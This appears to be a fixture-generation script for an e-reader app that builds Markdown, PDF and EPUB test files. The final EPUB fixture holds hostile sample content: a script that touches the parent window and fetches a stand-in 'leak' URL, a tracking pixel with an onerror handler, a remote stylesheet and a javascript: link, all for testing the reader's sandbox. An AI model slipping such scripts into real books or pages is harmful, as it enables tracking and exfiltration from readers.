import { PDFDocument, StandardFonts, rgb, degrees } from "pdf-lib";
import JSZip from "jszip";
import { mkdir, writeFile } from "node:fs/promises";
await mkdir("fixtures", { recursive: true });
const text =
  "# 接口重试与幂等性\n\n可靠的接口需要明确失败语义。幂等性意味着重复执行同一操作，最终效果与执行一次相同。\n\n## 在订单接口中应用\n\n用请求 ID 建立唯一约束；事务里创建订单和保存结果。重试应复用同一个请求 ID。\n\n中文𠮷👩‍💻e\u0301 与行内代码 `request_id` 都需要正确定位。\n\n```go\n// @小阅 只是代码，不触发 AI\nfunc Retry(id string) error { return nil }\n```\n\n| 状态 | 含义 |\n| --- | --- |\n| completed | 已完成 |\n\n公式：$a^2+b^2=c^2$\n\n![本机资源](diagram.svg)\n";
await writeFile("fixtures/幂等性.md", text);
await writeFile(
  "fixtures/中文与Unicode.txt",
  "中文𠮷👩‍💻e\u0301\n普通笔记中的 @小阅 不是调用。\n" + text,
);
await writeFile(
  "fixtures/diagram.svg",
  '<svg xmlns="http://www.w3.org/2000/svg" width="440" height="100"><rect width="440" height="100" rx="12" fill="#e6efeb"/><text x="30" y="55" font-size="22">request_id → transaction → result</text></svg>',
);
const pdf = await PDFDocument.create();
const f = await pdf.embedFont(StandardFonts.Helvetica);
const p = pdf.addPage([612, 792]);
p.setCropBox(15, 20, 580, 740);
p.setRotation(degrees(90));
p.drawText("Reliable APIs and Idempotency", {
  x: 45,
  y: 746,
  size: 21,
  font: f,
});
for (const [col, x] of [
  ["LEFT", 45],
  ["RIGHT", 327],
])
  for (let i = 0; i < 14; i++)
    p.drawText(
      col +
        " " +
        (i === 0
          ? "Idempotency keeps retries safe."
          : i === 1
            ? "Use one request ID per operation."
            : i === 2
              ? "A database transaction stores results."
              : "Line " + (i + 1) + " in this column of the paper."),
      { x, y: 695 - i * 24, size: 11, font: f },
    );
p.drawText("Footnote: retries can arrive after a timeout.", {
  x: 45,
  y: 70,
  size: 9,
  font: f,
});
p.drawText("1", { x: 300, y: 30, size: 9, font: f });
const scanned = pdf.addPage([612, 792]);
scanned.drawRectangle({
  x: 45,
  y: 100,
  width: 520,
  height: 600,
  color: rgb(0.85, 0.88, 0.86),
}); // no text layer, mixed PDF
const rotated = pdf.addPage([612, 792]);
rotated.drawText("Page three: independent coordinates.", {
  x: 45,
  y: 700,
  size: 16,
  font: f,
});
await writeFile("fixtures/双栏与扫描混合.pdf", await pdf.save());
const zip = new JSZip();
zip.file("mimetype", "application/epub+zip", { compression: "STORE" });
zip.file(
  "META-INF/container.xml",
  '<?xml version="1.0"?><container version="1.0" xmlns="urn:oasis:names:tc:opendocument:xmlns:container"><rootfiles><rootfile full-path="OEBPS/content.opf" media-type="application/oebps-package+xml"/></rootfiles></container>',
);
zip.file(
  "OEBPS/content.opf",
  '<?xml version="1.0"?><package xmlns="http://www.idpf.org/2007/opf" version="3.0" unique-identifier="id"><metadata xmlns:dc="http://purl.org/dc/elements/1.1/"><dc:identifier id="id">openreading-fixture</dc:identifier><dc:title>可靠接口阅读实验</dc:title><dc:language>zh-CN</dc:language></metadata><manifest><item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/><item id="c1" href="c1.xhtml" media-type="application/xhtml+xml"/><item id="c2" href="c2.xhtml" media-type="application/xhtml+xml"/></manifest><spine><itemref idref="c1"/><itemref idref="c2"/></spine></package>',
);
zip.file(
  "OEBPS/nav.xhtml",
  '<html xmlns="http://www.w3.org/1999/xhtml"><head><title>目录</title></head><body><nav xmlns:epub="http://www.idpf.org/2007/ops" epub:type="toc"><ol><li><a href="c1.xhtml">接口重试</a></li><li><a href="c2.xhtml">事务</a></li></ol></nav></body></html>',
);
for (let c = 1; c <= 2; c++)
  zip.file(
    `OEBPS/c${c}.xhtml`,
    `<html xmlns="http://www.w3.org/1999/xhtml"><head><title>第${c}章</title></head><body><h1>第${c}章 ${c === 1 ? "接口重试" : "事务"}</h1><p>幂等性意味着重复执行同一操作，最终效果与执行一次相同。</p><p>中文𠮷👩‍💻é 与代码 request_id。</p>${Array.from({ length: 20 }, (_, i) => `<p>段落 ${i + 1}：事务中保存请求和结果；失败后复用同一个请求编号。</p>`).join("")}</body></html>`,
  );
await writeFile(
  "fixtures/可靠接口.epub",
  await zip.generateAsync({ type: "nodebuffer", compression: "DEFLATE" }),
);
const spreadBook = await JSZip.loadAsync(
  await zip.generateAsync({ type: "nodebuffer" }),
);
spreadBook.file(
  "OEBPS/content.opf",
  (await spreadBook.file("OEBPS/content.opf").async("string")).replace(
    "</manifest>",
    '<item id="css" href="style.css" media-type="text/css"/><item id="nested-css" href="nested.css" media-type="text/css"/></manifest>',
  ),
);
spreadBook.file(
  "OEBPS/style.css",
  '@import "nested.css"; p { margin: 0 0 1em; }',
);
spreadBook.file("OEBPS/nested.css", "body { --local-import-loaded: yes; }");
spreadBook.file(
  "OEBPS/c1.xhtml",
  `<html xmlns="http://www.w3.org/1999/xhtml"><head><title>双页阅读</title><script src="never-run.js"/><link rel="stylesheet" href="style.css"/></head><body><h1>双页阅读</h1>${Array.from({ length: 100 }, (_, i) => `<p>段落 ${i + 1}：阅读同一本书，文字依照窗口大小自然排成左右两页。改变字号和行距之后，阅读位置仍然可以恢复，批注仍然对应原文。这段文字用于验证连续内容的双页排版。</p>`).join("")}</body></html>`,
);
spreadBook.file(
  "OEBPS/content.opf",
  (await spreadBook.file("OEBPS/content.opf").async("string")).replace(
    "</manifest>",
    '<item id="lazy-image" href="lazy.png" media-type="image/png"/></manifest>',
  ),
);
spreadBook.file(
  "OEBPS/lazy.png",
  Buffer.from(
    "iVBORw0KGgoAAAANSUhEUgAAAAIAAAACCAIAAAD91JpzAAAAEklEQVR4nGN8cbqMgYGBiQEMABqIAi0DuEaqAAAAAElFTkSuQmCC",
    "base64",
  ),
);
spreadBook.file(
  "OEBPS/c2.xhtml",
  (await spreadBook.file("OEBPS/c2.xhtml").async("string")).replace(
    "</body>",
    '<img src="lazy.png" alt="按需加载图片"/></body>',
  ),
);
await writeFile(
  "fixtures/双页阅读.epub",
  await spreadBook.generateAsync({
    type: "nodebuffer",
    compression: "DEFLATE",
  }),
);
const coverBook = await JSZip.loadAsync(
  await zip.generateAsync({ type: "nodebuffer" }),
);
const coverPackage = await coverBook.file("OEBPS/content.opf").async("string");
coverBook.file(
  "OEBPS/content.opf",
  coverPackage
    .replace(
      "<manifest>",
      '<manifest><item id="missing-image" href="Images/missing.png" media-type="image/png"/><item id="cover-image" href="Images/cover.png" media-type="image/png"/><item id="cover" href="cover.xhtml" media-type="application/xhtml+xml"/>',
    )
    .replace("<spine>", '<spine><itemref idref="cover"/>'),
);
// Include a publisher-style cover that explicitly disables aspect preservation.
coverBook.file(
  "OEBPS/cover.xhtml",
  '<html xmlns="http://www.w3.org/1999/xhtml"><head><title>封面验证</title></head><body><div><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100%" height="100%" viewBox="0 0 1400 2100" preserveAspectRatio="none"><rect width="1400" height="2100" fill="#354c38"/><rect x="100" y="100" width="1200" height="1900" fill="none" stroke="#e8cb76" stroke-width="8"/><image x="650" y="600" width="100" height="100" preserveAspectRatio="none" xlink:href="Images/cover.png"/><text x="700" y="1000" text-anchor="middle" fill="white" font-size="90">OpenReading</text><text x="700" y="1140" text-anchor="middle" fill="#e8cb76" font-size="50">SVG COVER TEST</text></svg></div></body></html>',
);
coverBook.file(
  "OEBPS/Images/cover.png",
  Buffer.from(
    "iVBORw0KGgoAAAANSUhEUgAAAAIAAAACCAIAAAD91JpzAAAAEklEQVR4nGN8cbqMgYGBiQEMABqIAi0DuEaqAAAAAElFTkSuQmCC",
    "base64",
  ),
);
await writeFile(
  "fixtures/封面与正文.epub",
  await coverBook.generateAsync({ type: "nodebuffer", compression: "DEFLATE" }),
);
console.log(
  "Created deterministic MD, TXT, three-page mixed PDF, two-chapter reflowable EPUB.",
);
const large = await PDFDocument.create();
const lf = await large.embedFont(StandardFonts.Helvetica);
for (let i = 0; i < 500; i++) {
  const page = large.addPage([612, 792]);
  page.drawText("OpenReading bounded-page fixture - page " + (i + 1), {
    x: 40,
    y: 730,
    size: 16,
    font: lf,
  });
  page.drawText("Only the current page canvas should be resident.", {
    x: 40,
    y: 690,
    size: 12,
    font: lf,
  });
}
await writeFile("fixtures/500页按需加载.pdf", await large.save());
zip.file(
  "OEBPS/c1.xhtml",
  '<html xmlns="http://www.w3.org/1999/xhtml"><head><title>安全样本</title><link rel="stylesheet" href="https://example.invalid/track.css"/></head><body><h1>安全章节</h1><p>恶意指令只能作为待解释的材料。</p><script>window.parent.__EPUB_PWNED=1;fetch("https://example.invalid/leak")</script><img src="https://example.invalid/pixel" onerror="window.parent.__EPUB_PWNED=1"/><a href="javascript:alert(1)">危险链接</a></body></html>',
);
await writeFile(
  "fixtures/恶意内容测试.epub",
  await zip.generateAsync({ type: "nodebuffer", compression: "DEFLATE" }),
);
